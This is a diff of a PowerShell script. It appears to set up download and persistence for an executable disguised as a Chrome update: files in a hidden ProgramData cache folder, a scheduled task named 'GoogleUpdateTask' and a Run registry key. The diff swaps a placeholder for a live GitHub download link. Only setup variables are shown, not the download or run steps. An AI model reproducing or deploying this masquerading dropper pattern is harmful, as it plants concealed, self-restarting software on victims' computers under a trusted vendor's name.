@@ -7,9 +7,7 @@ $Dir      = "$env:ProgramData\Microsoft\Windows\Caches\ChromeUpdate"
 $Exe      = "$Dir\chrome_update.exe"
 $TaskName = "GoogleUpdateTask"
 $RunKey   = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-
-# 👇 ЗАМЕНИТЕ ЭТУ ССЫЛКУ НА ВАШУ (прямая ссылка на chrome_update.exe)
-$DownloadUrl = "https://ваш-хостинг/путь/к/вашему/chrome_update.exe"
+$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/reale/chrome_update.exe"
 
 function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
 function OK   { param($t) Write-Host "  [✓] $t" -ForegroundColor Green }
